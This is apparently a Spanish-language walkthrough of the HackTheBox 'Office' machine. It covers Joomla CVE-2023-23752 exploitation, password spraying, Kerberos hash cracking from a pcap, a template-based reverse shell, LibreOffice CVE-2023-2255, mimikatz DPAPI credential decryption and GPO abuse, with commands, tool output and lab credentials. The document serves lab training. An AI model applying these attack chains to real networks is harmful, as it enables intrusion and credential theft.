---
title: HTB Office Writeup
date: 2024-06-22 08:00:00 -05:00
author: retxus
categories: [HTB, Windows - AD]
tags: [Windows, Winrm, Kerberos, Active Directory, CVE-2023-23752, wireshark, SMB, CVE-2023-2255, SharpGPOAbuse]
comments: false
image:
  path: /assets/img/HTB-Office/Office.png
---

Muy buenas con todos, el día de hoy voy a resolver la máquina `Office` de HTB, espero que el procedimiento sea de su agrado y fácil de comprender.

## Reconocimiento

Primero vemos si tenemos conexión con la máquina y de paso gracias al `ttl` identificamos ante el tipo de máquina que estámos, en `linux` este suele ser de 64 y en `windows` de 128.

```bash
ping -c 1 10.10.11.3
PING 10.10.11.3 (10.10.11.3) 56(84) bytes of data.
64 bytes from 10.10.11.3: icmp_seq=1 ttl=127 time=103 ms

--- 10.10.11.3 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 103.221/103.221/103.221/0.000 ms
```

Vemos que el `ttl` de la máquina es de 127, el cual está próximo a 128 por ende nos encontramos ante una máquina `Windows`.

Ahora vamos a identificar los puertos abiertos dentro de la máquina, los invito a usar el siguiente `script` hecho en `bash`.

```bash
#!/bin/bash

GREEN="\e[32m"
RED="\e[31m"
RESET="\e[0m"

IP="$1"

if [ -z "$IP" ]; then
  echo "Uso: $0 <IP>"
  exit 1
fi

TEMP_FILE=$(mktemp)

echo -e "${GREEN}[+] Escaneando todos los puertos abiertos... ${RESET}"

nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn "$IP" -oG "$TEMP_FILE"

# Extraer los puertos abiertos
PORTS=$(grep -oP '\d+/open' "$TEMP_FILE" | awk -F'/' '{print $1}' | tr '\n' ',' | sed 's/,$//'; echo)

rm "$TEMP_FILE"

if [ -z "$PORTS" ]; then
  echo -e "${RED}[-] No se encontraron puertos abiertos.${RESET}"
  exit 1
fi

echo -e "\n${GREEN}[+] Escanenado servicios en los puertos: $PORTS. ${RESET}\n"

nmap -sCV -p"$PORTS" "$IP" -oN target

echo -e "\n${GREEN}[+] Escano completado. Resultados en 'target'.${RESET}\n"
```

De preferencia es mejor usar este `script` como `root`, ya que algunos parámetros de `nmap`, requieren de privilegios elevados. Esto al final nos va a generar un archivo `target` que contiene la información de los puertos abiertos dentro de la máquina.

```bash
sudo ./scan.sh 10.10.11.44
```

```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
| http-robots.txt: 16 disallowed entries (15 shown)
| /joomla/administrator/ /administrator/ /api/ /bin/ 
| /cache/ /cli/ /components/ /includes/ /installation/ 
|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/
|_http-title: Home
|_http-generator: Joomla! - Open Source Content Management
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-17 23:58:57Z)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Not valid before: 2023-05-10T12:36:58
|_Not valid after:  2024-05-09T12:36:58
|_ssl-date: 2024-06-18T00:00:30+00:00; +8h00m01s from scanner time.
443/tcp   open  ssl/http      Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
|_ssl-date: TLS randomness does not represent time
|_http-title: 403 Forbidden
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-06-18T00:00:31+00:00; +8h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Not valid before: 2023-05-10T12:36:58
|_Not valid after:  2024-05-09T12:36:58
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Not valid before: 2023-05-10T12:36:58
|_Not valid after:  2024-05-09T12:36:58
|_ssl-date: 2024-06-18T00:00:30+00:00; +8h00m01s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Not valid before: 2023-05-10T12:36:58
|_Not valid after:  2024-05-09T12:36:58
|_ssl-date: 2024-06-18T00:00:31+00:00; +8h00m01s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
57372/tcp open  msrpc         Microsoft Windows RPC
59218/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
59223/tcp open  msrpc         Microsoft Windows RPC
59248/tcp open  msrpc         Microsoft Windows RPC
Service Info: Hosts: DC, www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-06-17T23:59:50
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 8h00m00s, deviation: 0s, median: 8h00m00s
```
Vemos que tenemos un dominio `office.htb`, así que lo agregamos al `/etc/hosts`.

```bash
127.0.0.1	localhost
::1		localhost
127.0.0.1	machinename.localhost	machinename

10.10.11.3    office.htb
```

### Enumerar usuarios

```bash
kerbrute userenum diccionario.txt --dc 10.10.11.3 -d office.htb -t 100
```

Vemos que nos enumera algunos usuarios, así que podemos guardarlos en un archivo.

```bash
cat valid_users.txt

Administrator
etower
ewhite
dwolfe
dlanor
dmichael
hhogan
```

## Enumeración de Joomla

Por el puerto `80`, vemos que en el propio escaneo con `nmap` nos indicó varias rutas referentes a joomla, como sabes el `CMS` que se está usando, podemos enumerar un poco. Si vamos a la siguiente ruta `http://10.10.11.3/administrator/manifests/files/joomla.xml`, podemos ver ante la versión que estamos.
![](/assets/img/HTB-Office/1_Office.png)

Conociendo la versión, podemos buscar un poco por algunas vulnerabilidades y nos encontramos con [esto](https://github.com/Acceis/exploit-CVE-2023-23752.git){:target="_blank"}, en donde podemos a través de las rutas de la `API` algunas cosas interesantes como usuarios y contraseñas.

```bash
ruby exploit.rb http://10.10.11.3

Users
[474] Tony Stark (Administrator) - Administrator@holography.htb - Super Users

Site info
Site name: Holography Industries
Editor: tinymce
Captcha: 0
Access: 1
Debug status: false

Database info
DB type: mysqli
DB host: localhost
DB user: root
DB password: H0lOgrams4reTakIng0Ver754!
DB name: joomla_db
DB prefix: if2tx_
DB encryption 0
```

Bueno, podemos ver un usuario y una contraseña, pero parece ser que no funciona en el panel administrativo de `joomla`, así que podemos ver otras alternativas.

## Enumeración SMB

Como tenemos una lista de usuarios y una contraseña, vamos a ver si está se reutiliza.

```bash
netexec smb office.htb -u valid_users -p 'H0lOgrams4reTakIng0Ver754!' --continue-on-success

SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.3      445    DC               [-] office.htb\Administrator:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office.htb\etower:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office.htb\ewhite:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754! 
SMB         10.10.11.3      445    DC               [-] office.htb\dlanor:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office.htb\dmichael:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office.htb\hhogan:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office.htb\tstark:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
```

Vemos que para el usuario `dwolfe`, nos pone un [+] así que vamos a ver que tenemos por `smb`.

```bash
smbmap -u dwolfe -p 'H0lOgrams4reTakIng0Ver754!' -H 10.10.11.3 --no-banner

[*] Detected 1 hosts serving SMB                                                                                                  
[*] estáblished 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.10.11.3:445	Name: office.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SOC Analysis                                      	READ ONLY	
	SYSVOL                                            	READ ONLY	Logon server share 
[*] Closed 1 connections
```
Vemos una carpeta compartida con el nombre `SOC Analysis`, así que vamos a conectarnos haciendo uso de `smbclient`.

```bash
smbclient "\\\\office.htb\\SOC Analysis" -U 'dwolfe%H0lOgrams4reTakIng0Ver754!'

smb: \> dir
  .                                   D        0  Wed May 10 13:52:24 2023
  ..                                DHS        0  Wed Feb 14 05:18:31 2024
  Latest-System-Dump-8fbc124d.pcap      A  1372860  Sun May  7 19:59:00 2023

		6265599 blocks of size 4096. 1188867 blocks available
smb: \> get Latest-System-Dump-8fbc124d.pcap
```

## PCAP Analysis

Podemos ver un archivo `.pcap`, así que nos lo traemos al equipo para poder ver que contiene. Para analizarlo hacemos uso de `wireshark`, después de una búsqueda, vemos algunos valores interesantes, hay un par de paquetes referentes a una conexión de `kerberos`, buscando un poco, en esta [web](https://vbscrub.com/2020/02/27/getting-passwords-from-kerberos-pre-authentication-packets/){:target="_blank"}, nos indican como podemos crear un hash, a partir de diferentes valores.

![](/assets/img/HTB-Office/2_Office.png)
![](/assets/img/HTB-Office/3_Office.png)


Como nos indican en la web, podemos componer un hash para posteriormente intentar romperlo, allí también nos dicen el modo usado en `hashcat`.

```bash
cat hash

$krb5pa$18$tstark$OFFICE.HTB$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc

hashcat -m 19900 "$krb5pa$18$tstark$OFFICE.HTB$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc" rockyou.txt
```

Se pudo romper el `hash` y nos devuelve como contraseña `playboy69`, como también vimos, hay un usuario llamado `tstark`, y si recordamos por `joomla`, tenemos al usuario `Tony Stark`, como administrator de la web, así que tratamos de conectarnos.
![](/assets/img/HTB-Office/4_Office.png)

Una vez dentro indagamos un poco para ver que podemos hacer.

## Ganando acceso

Vemos que podemos modificar un `template` y estos están escritos en php, así que vamos a ver si logramos ganar acceso por allí.

![](/assets/img/HTB-Office/5_Office.png)
![](/assets/img/HTB-Office/6_Office.png)
![](/assets/img/HTB-Office/7_Office.png)
![](/assets/img/HTB-Office/8_Office.png)
![](/assets/img/HTB-Office/9_Office.png)

Vemos que agregado esa línea a un `template` y yendo a su dirección en la web, podemos ejecutar comandos, para ganar acceso yo hice uso de `PowerShell #3 (Base64)`, apoyándome [aquí](https://www.revshells.com/){:target="_blank"}

```bash
rlwrap -cAr nc -nlvp 4444

Connection from 10.10.11.3:63629

PS C:\xampp\htdocs\joomla\templates\cassiopeia> whoami
office\web_account
PS C:\xampp\htdocs\joomla\templates\cassiopeia>
```
## Pivotando entre usuarios

Como en el análisis del `.pcap`, vimos que la conexión por `kerberos`, era por parte del usuario `tstark`, podemos tratar de conectarnos como dicho usuario haciendo uso de <a href="https://github.com/antonioCoco/RunasCs/releases">runas</a>.

![](/assets/img/HTB-Office/10_Office.png)

Y ahora ya como el usuario `tstark` podemos ver la primera `flag`. Después de indagar un poco vemos que de forma interna en la máquina está abierto el puerto `8083`, así que usando `chisel`, lo traemos a nuestra máquina para ver que contiene.

![](/assets/img/HTB-Office/11_Office.png)

Si nos vamos a la web vemos, que hay un apartado donde podemos subir archivos (.Doc, .Docx, .Docm y .Odt) para aplicar a un trabajo, y posteriormente ser revisados, me gustaría pensar que para ver estos archivos usan algun programa como `Libre Office`. Después de buscar un poco en la máquina vemos que efectivamente se usa `Libre Office` y buscando un poco nos encontramos con esta [vulnerabilidad](https://github.com/elweth-sec/CVE-2023-2255){:target="_blank"}.
Así que procedemos a crear un payload malicioso y a subirlo a la máquina.

![](/assets/img/HTB-Office/12_Office.png)

Nos ponemos en escucha y esperamos.

![](/assets/img/HTB-Office/13_Office.png)

Y podemos ver que ahora logramos tener acceso como el usuario `ppots`, para seguir avanzando vamos a enumerar credenciales.

```bash
PS C:\Users\PPotts\Downloads> Get-ChildItem -Hidden C:\Users\ppotts\AppData\Roaming\Microsoft\Credentials\

    Directory: C:\Users\ppotts\AppData\Roaming\Microsoft\Credentials


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a-hs-          5/9/2023   2:08 PM            358 18A1927A997A794B65E9849883AC3F3E                                     
-a-hs-          5/9/2023   4:03 PM            398 84F1CAEEBF466550F4967858F9353FB4                                     
-a-hs-         1/18/2024  11:53 AM            374 E76CCA3670CD9BB98DF79E0A8D176F1E                                     
```
Vemos que tenemos algo, así que subimos el [mimikatz](https://github.com/ParrotSec/mimikatz/blob/master/x64/mimikatz.exe){:target="_blank"}, para descifrar los datos.

```bash
PS C:\Users\PPotts\Downloads> dir
dir


    Directory: C:\Users\PPotts\Downloads


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         6/17/2024  11:29 PM        1250056 mimikatz.exe                                                         


PS C:\Users\PPotts\Downloads> ./mimikatz.exe
./mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\credentials\84F1CAEEBF466550F4967858F9353FB4
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {191d3f9d-7959-4b4d-a520-a444853c47eb}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 0000003a - 58
  szDescription      : Enterprise Credential Data

  algCrypt           : 00006603 - 26115 (CALG_3DES)
  dwAlgCryptLen      : 000000c0 - 192
  dwSaltLen          : 00000010 - 16
  pbSalt             : 649c4466d5d647dd2c595f4e43fb7e1d
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         : 
  algHash            : 00008004 - 32772 (CALG_SHA1)
  dwAlgHashLen       : 000000a0 - 160
  dwHmac2KeyLen      : 00000010 - 16
  pbHmack2Key        : 32e88dfd1927fdef0ede5abf2c024e3a
  dwDataLen          : 000000c0 - 192
  pbData             : f73b168ecbad599e5ca202cf9ff719ace31cc92423a28aff5838d7063de5cccd4ca86bfb2950391284b26a34b0eff2dbc9799bdd726df9fad9cb284bacd7f1ccbba0fe140ac16264896a810e80cac3b68f82c80347c4deaf682c2f4d3be1de025f0a68988fa9d633de943f7b809f35a141149ac748bb415990fb6ea95ef49bd561eb39358d1092aef3bbcc7d5f5f20bab8d3e395350c711d39dbe7c29d49a5328975aa6fd5267b39cf22ed1f9b933e2b8145d66a5a370dcf76de2acdf549fc97
  dwSignLen          : 00000014 - 20
  pbSign             : 21bfb22ca38e0a802e38065458cecef00b450976


mimikatz # exit
Bye!
```
Nos guardamos la `guidMasterkey`, ya que será necesaria más adelante. Y enumeramos el siguiente directorio y copiamos en `name`.

```bash

PS C:\Users\PPotts\Downloads> dir C:\Users\PPotts\appdata\roaming\microsoft\protect

    Directory: C:\Users\PPotts\appdata\roaming\microsoft\protect


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d---s-         1/17/2024   3:43 PM                S-1-5-21-1199398058-4196589450-691661856-1107                        


PS C:\Users\PPotts\Downloads> ./mimikatz.exe
./mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # dpapi::masterkey /in:C:\Users\PPotts\appdata\roaming\microsoft\protect\{name-SID}\{guidMasterkey} /rpc
**MASTERKEYS**
  dwVersion          : 00000002 - 2
  szGuid             : {191d3f9d-7959-4b4d-a520-a444853c47eb}
  dwFlags            : 00000000 - 0
  dwMasterKeyLen     : 00000088 - 136
  dwBackupKeyLen     : 00000068 - 104
  dwCredHistLen      : 00000000 - 0
  dwDomainKeyLen     : 00000174 - 372
[masterkey]
  **MASTERKEY**
    dwVersion        : 00000002 - 2
    salt             : c521daa0857ee4fa6e4246266081e94c
    rounds           : 00004650 - 18000
    algHash          : 00008009 - 32777 (CALG_HMAC)
    algCrypt         : 00006603 - 26115 (CALG_3DES)
    pbKey            : 1107e1ab3e107528a73a2dafc0a2db28de1ea0a07e92cff03a935635013435d75e41797f612903d6eea41a8fc4f7ebe8d2fbecb0c74cdebb1e7df3c692682a066faa3edf107792d116584625cc97f0094384a5be811e9d5ce84e5f032704330609171c973008d84f

[backupkey]
  **MASTERKEY**
    dwVersion        : 00000002 - 2
    salt             : a2741b13d7261697be4241ebbe05098a
    rounds           : 00004650 - 18000
    algHash          : 00008009 - 32777 (CALG_HMAC)
    algCrypt         : 00006603 - 26115 (CALG_3DES)
    pbKey            : 21bf24763fbb1400010c08fccc5423fe7da8190c61d3006f2d5efd5ea586f463116805692bae637b2ab548828b3afb9313edc715edd11dc21143f4ce91f4f67afe987005320d3209

[domainkey]
  **DOMAINKEY**
    dwVersion        : 00000002 - 2
    dwSecretLen      : 00000100 - 256
    dwAccesscheckLen : 00000058 - 88
    guidMasterKey    : {e523832a-e126-4d6e-ac04-ed10da72b32f}
    pbSecret         : 159613bdc2d90dd4834a37e29873ce04c74722a706d0ba4770865039b3520ff46cf9c9281542665df2e72db48f67e16e2014e07b88f8b2f7d376a8b9d47041768d650c20661aee31dc340aead98b7600662d2dc320b4f89cf7384c2a47809c024adf0694048c38d6e1e3e10e8bd7baa7a6f1214cd3a029f8372225b2df9754c19e2ae4bc5ff4b85755b4c2dfc89add9f73c54ac45a221e5a72d3efe491aa6da8fb0104a983be20af3280ae68783e8648df413d082fa7d25506e9e6de1aadbf9cf93ec8dfc5fab4bfe1dd1492dbb679b1fa25c3f15fb8500c6021f518c74e42cd4b5d5d6e1057f912db5479ebda56892f346b4e9bf6404906c7cd65a54eea2842
    pbAccesscheck    : 1430b9a3c4ab2e9d5f61dd6c62aab8e1742338623f08461fe991cccd5b3e4621d4c8e322650460181967c409c20efcf02e8936c007f7a506566d66ba57448aa8c3524f0b9cf881afcbb80c9d8c341026f3d45382f63f8665


Auto SID from path seems to be: S-1-5-21-1199398058-4196589450-691661856-1107

[domainkey] with RPC
[DC] 'office.htb' will be the domain
[DC] 'DC.office.htb' will be the DC server
  key : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
  sha1: 85285eb368befb1670633b05ce58ca4d75c73c77

mimikatz # dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\credentials\84F1CAEEBF466550F4967858F9353FB4 /guidMasterkey::e523832a-e126-4d6e-ac04-ed10da72b32f
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {191d3f9d-7959-4b4d-a520-a444853c47eb}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 0000003a - 58
  szDescription      : Enterprise Credential Data

  algCrypt           : 00006603 - 26115 (CALG_3DES)
  dwAlgCryptLen      : 000000c0 - 192
  dwSaltLen          : 00000010 - 16
  pbSalt             : 649c4466d5d647dd2c595f4e43fb7e1d
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         : 
  algHash            : 00008004 - 32772 (CALG_SHA1)
  dwAlgHashLen       : 000000a0 - 160
  dwHmac2KeyLen      : 00000010 - 16
  pbHmack2Key        : 32e88dfd1927fdef0ede5abf2c024e3a
  dwDataLen          : 000000c0 - 192
  pbData             : f73b168ecbad599e5ca202cf9ff719ace31cc92423a28aff5838d7063de5cccd4ca86bfb2950391284b26a34b0eff2dbc9799bdd726df9fad9cb284bacd7f1ccbba0fe140ac16264896a810e80cac3b68f82c80347c4deaf682c2f4d3be1de025f0a68988fa9d633de943f7b809f35a141149ac748bb415990fb6ea95ef49bd561eb39358d1092aef3bbcc7d5f5f20bab8d3e395350c711d39dbe7c29d49a5328975aa6fd5267b39cf22ed1f9b933e2b8145d66a5a370dcf76de2acdf549fc97
  dwSignLen          : 00000014 - 20
  pbSign             : 21bfb22ca38e0a802e38065458cecef00b450976

Decrypting Credential:
 * volatile cache: GUID:{191d3f9d-7959-4b4d-a520-a444853c47eb};KeyHash:85285eb368befb1670633b05ce58ca4d75c73c77
**CREDENTIAL**
  credFlags      : 00000030 - 48
  credSize       : 000000be - 190
  credUnk0       : 00000000 - 0

  Type           : 00000002 - 2 - domain_password
  Flags          : 00000000 - 0
  LastWritten    : 5/9/2023 11:03:21 PM
  unkFlagsOrSize : 00000018 - 24
  Persist        : 00000003 - 3 - enterprise
  AttributeCount : 00000000 - 0
  unk0           : 00000000 - 0
  unk1           : 00000000 - 0
  TargetName     : Domain:interactive=OFFICE\HHogan
  UnkData        : (null)
  Comment        : (null)
  TargetAlias    : (null)
  UserName       : OFFICE\HHogan
  CredentialBlob : H4ppyFtW183#
  Attributes     : 0
```
Y como podemos ver logramos obtener la credencial del usuario `HHogan`, ahora hacemos uso de `evil-winrm` para ingresar a la máquina.


```bash
evil-winrm -i 10.10.11.3 -u 'HHogan' -p 'H4ppyFtW183#'
```

## Escalada de privilegios

Vemos que el usuario `HHogan`, pertenece al grupo `GPO Mangers`.

![](/assets/img/HTB-Office/14_Office.png)

Este puede escribir en la política de grupo de dominio predeterminada. Está capacidad permite a un atacante realizar una amplia variedad de ataques, puede ejecutar comandos a través de tareas programadas, deshabilitar o modificar servicios del sistema, elevar privilegios y más. Con la ayuda de este ejecutable [SharpGPOAbuse](https://github.com/byronkg/SharpGPOAbuse/releases/tag/1.0){:target="_blank"} nos agregamos a la computadora como administrador local vía GPO.

![](/assets/img/HTB-Office/15_Office.png)

Actualizamos la configuración de la política de grupos de `windows`.

```bash
*Evil-WinRM* PS C:\Users\HHogan\Documents> gpupdate /force
Updating policy...


Computer Policy update has completed successfully.

User Policy update has completed successfully.
```

Ahora `HHogan` está en el grupo `administrators`.

```bash
*Evil-WinRM* PS C:\Users\HHogan\Documents> net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
HHogan
The command completed successfully.
```

Y por último podemos conectarnos haciendo uso de `Psexec.py` y con esto ya podemos ver la última `flag`.

![](/assets/img/HTB-Office/16_Office.png)
